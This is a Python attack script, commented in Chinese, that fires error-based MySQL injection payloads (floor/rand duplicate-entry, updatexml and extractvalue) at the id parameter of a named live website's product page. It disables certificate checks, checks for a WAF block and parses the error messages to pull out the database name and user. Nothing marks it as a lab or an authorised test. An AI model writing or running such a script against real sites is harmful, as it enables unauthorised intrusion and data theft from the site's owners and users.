#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl, re, time
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def get(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        return r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        return e.read(80000).decode('utf-8','ignore')
    except Exception as e:
        return 'ERR:%s' % repr(e)[:60]

# floor/rand 报错注入(经典duplicate entry报错)
payloads = [
    ('floor报错-database()', "687' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#"),
    ('floor报错-user()', "687' and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)#"),
    ('updatexml-database', "687' and updatexml(1,concat(0x7e,database()),1)#"),
    ('extractvalue-database', "687' and extractvalue(1,concat(0x7e,database()))#"),
]

for name, p in payloads:
    b = get(p)
    if 'WTS-WAF' in b:
        print('%s -> WAF拦截' % name)
    elif 'Duplicate entry' in b or 'duplicate' in b.lower():
        m = re.search(r"Duplicate entry '([^']+)'", b)
        print('%s -> 报错注入成功! 数据: %s' % (name, m.group(1) if m else b[:200]))
    elif 'Invalid SQL' in b:
        m = re.search(r'MySQL Error[^<]*', b)
        print('%s -> SQLERR: %s' % (name, m.group(0)[:120] if m else ''))
    elif 'XPATH' in b:
        m = re.search(r"XPATH syntax error: '([^']+)'", b)
        print('%s -> XPATH报错: %s' % (name, m.group(1) if m else ''))
    else:
        print('%s -> len=%d 其他' % (name, len(b)))
    time.sleep(1)
